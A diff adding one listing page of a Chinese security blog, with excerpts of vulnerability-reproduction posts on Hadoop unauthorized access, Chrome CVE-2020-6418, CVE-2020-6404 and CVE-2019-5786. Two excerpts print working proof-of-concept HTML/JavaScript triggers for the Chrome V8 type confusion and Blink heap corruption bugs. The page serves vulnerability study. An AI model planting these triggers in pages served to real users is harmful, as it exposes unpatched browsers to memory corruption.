+        <a data-url="https://she11c0de.github.io/2022/07/07/Harbor/%EF%BC%88CVE-2019-16097%EF%BC%89Harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qpp6008hy8v19m1pglgy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Hadoop/Hadoop未授权访问" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Hadoop/Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.201Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
+<p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce<br>算法进行分布式处理。这个框架被Adobe，Last<br>fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p>
+</blockquote>
+<ul>
+<li><p>  用户创建一个处理键值的map函数</p>
+</li>
+<li><p>  产生了一套中间键/值</p>
+</li>
+<li><p>  reduce函数合并中间值并把他们关联到对应的键</p>
+</li>
+</ul>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1. 扫描探测"></a>1. 扫描探测</h4><h5 id="1-1-常见端口"><a href="#1-1-常见端口" class="headerlink" title="1.1 常见端口"></a>1.1 常见端口</h5><p><img src="/resource/Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId26.png"></p>
+<h5 id="1-2-敏感端口"><a href="#1-2-敏感端口" class="headerlink" title="1.2 敏感端口"></a>1.2 敏感端口</h5>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Hadoop/Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Hadoop/Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2qqno008py8v19ids1urr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Google/（CVE-2020-6418）Chrome 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Google/%EF%BC%88CVE-2020-6418%EF%BC%89Chrome%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.159Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-6418）Chrome-远程代码执行漏洞"><a href="#（CVE-2020-6418）Chrome-远程代码执行漏洞" class="headerlink" title="（CVE-2020-6418）Chrome 远程代码执行漏洞"></a>（CVE-2020-6418）Chrome 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在Google Chrome浏览器80.0.3987.122以下与Microsoft<br>Edge浏览器80.0.361.62以下的版本中，开源JavaScript和WebAssembly引擎V8中存在一个类型混淆漏洞（CVE-2020-6418），可能导致攻击者非法访问数据，从而执行恶意代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Google Chrome浏览器80.0.3987.122以下与Microsoft<br>Edge浏览器80.0.361.62以下的版本中</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;script&gt;
+        ITERATIONS = 10000
+        TRIGGER = false
+
+        function f(a,p)&#123;
+            return a.pop(Reflect.construct(function()&#123;&#125;, arguments, p))
+        &#125;
+
+        let a;
+        let p = new Proxy(Object, &#123;
+            get: function()&#123;
+                if (TRIGGER)&#123;
+                    a[2] = 1.1;
+                &#125;
+                return Object.prototype;
+            &#125;
+        &#125;);
+        for(let i = 0; i &lt; ITERATIONS; i++)&#123;
+            let isLastIteration = i==ITERATIONS-1;
+            a = [0,1,2,3,4];
+            if(isLastIteration)
+                TRIGGER = true;
+            console.log(f(a,p));
+        &#125;
+        console.log(a)
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    CVE-2020-6418 PoC!
+&lt;/body&gt;
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ChoKyuWon/CVE-2020-6418/blob/master/poc.html">https://github.com/ChoKyuWon/CVE-2020-6418/blob/master/poc.html</a></p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Google/%EF%BC%88CVE-2020-6418%EF%BC%89Chrome%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Google/%EF%BC%88CVE-2020-6418%EF%BC%89Chrome%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqnn008my8v1a6qqap5h" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Google/（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Google/%EF%BC%88CVE-2020-6404%EF%BC%89Google%20Chrome%20Blink%20%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.156Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-6404）Google-Chrome-Blink-缓冲区错误漏洞"><a href="#（CVE-2020-6404）Google-Chrome-Blink-缓冲区错误漏洞" class="headerlink" title="（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞"></a>（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在80.0.3987.87之前的Google<br>Chrome中，Blink中的不当实现使远程攻击者有可能通过精心制作的HTML页面利用堆破坏。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Google Chrome 80.0.3987.87</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+document.addEventListener(&quot;DOMContentLoaded&quot;, function()&#123;
+find(decodeURIComponent(&#39;\uFFFC&#39;));
+&#125;);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;legend&gt;&lt;/legend&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><img src="/resource/(CVE-2020-6404)GoogleChromeBlink%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Google/%EF%BC%88CVE-2020-6404%EF%BC%89Google%20Chrome%20Blink%20%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Google/%EF%BC%88CVE-2020-6404%EF%BC%89Google%20Chrome%20Blink%20%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqnn008ly8v15b31adfa" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Google/（CVE-2019-5786）Chrome 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Google/%EF%BC%88CVE-2019-5786%EF%BC%89Chrome%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.154Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-5786）Chrome-远程代码执行漏洞"><a href="#（CVE-2019-5786）Chrome-远程代码执行漏洞" class="headerlink" title="（CVE-2019-5786）Chrome 远程代码执行漏洞"></a>（CVE-2019-5786）Chrome 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者利用该漏洞配合一个win32k.sys的内核提权（CVE-2019-0808<br>）可以在win7上穿越Chrome沙箱</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>72.0.3626.121或更高版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>测试环境为：</p>
+<pre><code>win7 x86
+谷歌浏览器版本为72.0.3626.119
+</code></pre>
+<p><img src="/resource/(CVE-2019-5786)Chrome%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>这里看一下参数说明</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Google/%EF%BC%88CVE-2019-5786%EF%BC%89Chrome%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Google/%EF%BC%88CVE-2019-5786%EF%BC%89Chrome%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqnm008ky8v16y0788ng" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/70/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/69/">69</a><a class="page-number" href="/page/70/">70</a><span class="page-number current">71</span><a class="page-number" href="/page/72/">72</a><a class="page-number" href="/page/73/">73</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/72/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
